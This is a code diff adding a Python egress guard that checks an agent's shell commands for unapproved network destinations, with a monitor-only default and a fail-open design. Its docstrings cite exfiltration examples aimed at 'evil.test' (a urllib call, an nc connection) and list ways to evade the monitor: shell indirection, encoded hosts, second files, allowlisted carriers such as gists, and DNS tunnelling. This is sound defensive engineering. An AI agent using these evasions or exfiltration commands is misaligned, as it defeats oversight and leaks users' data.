+    if any(host.endswith(s) for s in (".local", ".internal", ".lan", ".home.arpa")):
+        return True
+    # A single-label name has no public DNS delegation, so it cannot address a
+    # host outside this network.
+    return "." not in host
+
+
+def _suffix_match(host: str, patterns: Sequence[str]) -> bool:
+    """Suffix match, so ``github.com`` covers ``api.github.com``."""
+    host = host.rstrip(".").lower()
+    for raw in patterns or ():
+        pattern = str(raw).strip().lstrip("*.").rstrip(".").lower()
+        if pattern and (host == pattern or host.endswith("." + pattern)):
+            return True
+    return False
+
+
+def _command_tokens(command: str) -> List[str]:
+    """Best-effort argv tokens. Falls back to whitespace splitting."""
+    try:
+        return shlex.split(command, posix=True)
+    except Exception:  # noqa: BLE001 — unbalanced quotes are common in the wild
+        return command.split()
+
+
+def egress_destinations(command: str) -> List[str]:
+    """Non-local network destinations named anywhere in *command*.
+
+    Two extraction passes, because the two evade differently:
+
+    1. **URLs, over the raw string.** Deliberately not over tokens — the point
+       is to see ``https://evil.test`` inside
+       ``python -c "urllib.request.urlopen('https://evil.test')"``, which a
+       ``curl``/``wget`` pattern list never sees.
+    2. **Bare hosts, over the tokens**, and only for the tools in
+       :data:`_BARE_HOST_TOOLS`. ``nc evil.test 4444`` carries no URL at all.
+
+    Returns hosts in first-seen order, deduplicated, already filtered to those
+    :func:`_host_is_local` calls non-local.
+    """
+    found: List[str] = []
+    seen = set()
+
+    def _add(host: str) -> None:
+        host = (host or "").strip().rstrip(".").lower()
+        if not host or host in seen:
+            return
+        if not (_DNS_CHARS_RE.match(host) or _is_ip_literal(host)):
+            return
+        if _host_is_local(host):
+            return
+        seen.add(host)
+        found.append(host)
+
+    for match in _EGRESS_URL_RE.finditer(command or ""):
+        _add(_strip_host(match.group("netloc")))
+
+    for segment in _SEGMENT_SPLIT_RE.split(command or ""):
+        if _segment_program(segment) not in _BARE_HOST_TOOLS:
+            continue
+        for token in _command_tokens(segment):
+            if token.startswith("-") or "://" in token:
+                continue
+            # socat spells it TCP:host:port; scp spells it user@host:path.
+            for part in re.split(r"[:@,]", token):
+                part = part.strip()
+                if not part or part.isdigit():
+                    continue
+                if _looks_like_hostname(part) or _is_ip_literal(part):
+                    _add(part)
+    return found
+
+
+def _is_ip_literal(token: str) -> bool:
+    try:
+        import ipaddress  # noqa: PLC0415
+
+        ipaddress.ip_address(token)
+    except Exception:  # noqa: BLE001 — not an address
+        return False
+    return True
+
+
+def _segment_program(segment: str) -> str:
+    """The program a pipeline segment actually runs, or ``""``.
+
+    Skips leading ``VAR=value`` assignments and wrappers like ``env``/``sudo``,
+    so ``env -u GITHUB_TOKEN ssh host`` reports ``ssh``. Flags are skipped only
+    while looking for the program name.
+    """
+    for token in _command_tokens(segment):
+        if "=" in token and not token.startswith("-") and "/" not in token:
+            continue  # VAR=value
+        if token.startswith("-"):
+            continue
+        name = _program_basename(token)
+        if name in _COMMAND_PREFIXES:
+            continue
+        return name
+    return ""
+
+
+def _program_basename(token: str) -> str:
+    """``/usr/bin/curl.exe`` -> ``curl``. Lowercased, extension stripped."""
+    name = token.replace("\\", "/").rsplit("/", 1)[-1].lower()
+    for suffix in (".exe", ".cmd", ".bat", ".ps1"):
+        if name.endswith(suffix):
+            name = name[: -len(suffix)]
+    return name
+
+
+def _network_invoker(command: str, invokers: Sequence[str]) -> Optional[str]:
+    """The first recognised network-capable program in *command*, if any."""
+    wanted = {str(i).strip().lower() for i in (invokers or ()) if str(i).strip()}
+    if not wanted:
+        return None
+    for token in _command_tokens(command or ""):
+        name = _program_basename(token)
+        if name in wanted:
+            return name
+    return None
+
+
+def _record_egress_finding(root: Path, policy: dict, finding: dict) -> None:
+    """Append one JSONL finding. Never raises, never blocks on failure."""
+    try:
+        import json  # noqa: PLC0415
+        from datetime import datetime, timezone  # noqa: PLC0415
+
+        rel = str(policy.get("log_path") or ".tmp/egress_findings.jsonl")
+        path = Path(rel) if Path(rel).is_absolute() else root / rel
+        path.parent.mkdir(parents=True, exist_ok=True)
+        finding = dict(finding)
+        finding["at"] = datetime.now(timezone.utc).isoformat()
+        with path.open("a", encoding="utf-8") as handle:
+            handle.write(json.dumps(finding, ensure_ascii=False) + "\n")
+    except Exception:  # noqa: BLE001 — telemetry must never take the guard down
+        pass
+
+
+def check_network_egress(
+    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
+) -> Optional[str]:
+    """Block reason for a command that sends data to an unapproved destination.
+
+    Monitor-only by default: every finding is appended to the JSONL sink named
+    by ``args/agent_egress_policy.yaml``, and ``None`` is returned so the call
+    proceeds. Set ``enforce: true`` there, or ``ICDEV_EGRESS_GUARD_ENFORCE=1``,
+    to turn a ``verdict: egress`` finding into a refusal. ``ICDEV_EGRESS_GUARD=0``
+    disables it outright. Fails OPEN on every internal error.
+
+    **What it models.** The DESTINATION, not the program. A host that is neither
+    local nor allowlisted is the finding; the program is only a confidence
+    signal on top of it. That ordering is the whole point — a
+    ``curl``/``wget`` pattern list is defeated by ``python -c "urllib..."`` or a
+    raw IP, and both of those still name a destination.
+
+    Two verdicts, and they are not interchangeable:
+
+    ``egress``
+        A non-local, non-allowlisted destination AND a recognised
+        network-capable program. Blockable when enforcing.
+    ``destination_only``
+        The destination, with no recognised program. Recorded, never blocked —
+        an unrecognised program is exactly the case this check cannot decide,
+        and pretending otherwise would be the dishonest half of the control.
+
+    **Evasion boundary — what this does NOT catch.** Stated plainly because a
+    guard whose limits are implied gets trusted past them. A shell command is
+    not statically decidable, so every one of these passes:
+
+    * **Indirection through the shell.** ``curl "$URL"``, ``curl $(cat u.txt)``,
+      ``eval "$payload"``. The destination is not in the string this check sees.
+    * **Encoding.** A base64 or hex host decoded at runtime; a host assembled by
+      concatenation (``"evi"+"l.test"``); punycode nobody has normalised.
+    * **A second file.** ``python exfil.py``, ``bash deploy.sh``, or any
+      compiled binary. The destination lives in a file, and this check reads
+      commands, not file contents.
+    * **An allowlisted carrier.** ``github.com`` is allowlisted, so a gist push,
+      a branch of secrets, or a GitHub issue body is egress this permits by
+      construction. Allowlisting a host allows *everything* that host can carry.
+    * **Non-IP transports.** DNS tunnelling, ICMP, a bound listener the peer
+      connects INTO, anything already-open like an SSH master socket.
+    * **Length.** Extraction runs over the literal command text only; a
+      destination assembled across two tool calls is invisible to both.
+
+    What it does raise the cost of: the direct, unobfuscated exfil that the
+    four probes in ``tests/test_skip_permissions_compensating_controls.py``
+    represent, on the surface — the spawned CLI — where nothing was watching at
+    all. It is a tripwire with a named blind spot, not a network boundary. The
+    boundary is ``egress_policy_manager``'s NetworkPolicy, at the pod.
+    """
+    if _off("ICDEV_EGRESS_GUARD"):
+        return None
+    try:
+        root = _resolve_root(repo_root)
+        policy = _load_egress_policy(root)
+        if not policy:
+            return None
+
+        command_tools = policy.get("command_tools") or []
+        if tool_name not in command_tools:
+            return None
+        command = (tool_input or {}).get("command") or ""
+        if not isinstance(command, str) or not command.strip():
+            return None
+
+        destinations = egress_destinations(command)
+        if not destinations:
+            return None
+
+        denied = [
+            h for h in destinations
+            if _suffix_match(h, policy.get("denied_hosts") or [])
+        ]
+        unapproved = [
+            h for h in destinations
+            if h in denied
+            or not _suffix_match(h, policy.get("allowed_hosts") or [])
+        ]
+        if not unapproved:
+            return None
+
+        invoker = _network_invoker(command, policy.get("network_invokers") or [])
+        verdict = "egress" if invoker else "destination_only"
+
+        _record_egress_finding(
+            root,
+            policy,
+            {
+                "verdict": verdict,
+                "tool": tool_name,
+                "destinations": unapproved,
+                "denied": denied,
+                "invoker": invoker,
+                # The command is recorded because a finding nobody can triage is
+                # not evidence. The sink is .tmp/ (gitignored) for that reason.
+                "command": command[:2000],
+            },
+        )
+
+        enforcing = _on("ICDEV_EGRESS_GUARD_ENFORCE") or bool(policy.get("enforce"))
+        if not enforcing or verdict != "egress":
+            return None
+        return (
+            "BLOCKED: network egress to an unapproved destination "
+            f"({', '.join(unapproved)}) via '{invoker}'. Add the host to "
+            "agent_egress.allowed_hosts in args/agent_egress_policy.yaml if this "
+            "is legitimate, or set ICDEV_EGRESS_GUARD_ENFORCE=0 to downgrade "
+            "this check to monitor-only."
+        )
+    except Exception:  # noqa: BLE001 — see docstring: fails open
         return None
